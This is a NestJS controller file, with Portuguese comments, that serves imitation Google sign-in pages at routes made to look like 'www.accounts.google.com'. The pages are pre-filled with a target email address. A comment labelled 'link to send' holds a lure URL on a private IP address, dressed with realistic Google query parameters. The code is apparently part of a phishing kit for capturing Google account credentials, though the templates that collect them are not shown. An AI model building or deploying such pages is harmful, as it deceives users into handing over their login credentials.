import { Get, Controller, Render } from '@nestjs/common';
import { url } from 'inspector';
import { AppService } from './app.service';

@Controller()
export class AppController {

  email: string = "gmail@gmail.com";
  imageDefault: string = "https://lh3.googleusercontent.com/a/default-user=s24-p";

  constructor(private readonly appService: AppService) {

    this.appService.emailLogin(this.email);
  }

  // Link para enviar
  // http://10.10.10.155:3000/www.accounts.google.com/#v3/signin/confirmidentifier?dsh=S-955960223%3A1678299953140568&authuser=1&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fhl%3Dpt_BR%26utm_source%3DOGB%26utm_medium%3Dact%26authuser%3D1%26pageId%3Dnone&passive=1209600&sacu=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AWnogHeIjHiQ4LiWBdPcASpyazywqI3j5OaOqghsrN-xdtEfh6h1bfuTwGuOGST5rKRX89l2KBkO
  
  @Get('/www.accounts.google.com')
  @Render('Login_Google1')
  html1() {

    // Link de suporte: https://docs.nestjs.com/techniques/mvc#template-rendering
    return {
      UserName: this.email,
      //imageUser: this.appService.getLinkImage()
      imageUser: this.imageDefault
    }
  }

  @Get('/www.accounts.google.com/v3')
  @Render('Login_Google2')
  html2() {
    return {
      UserName: this.email
    }
  }
}
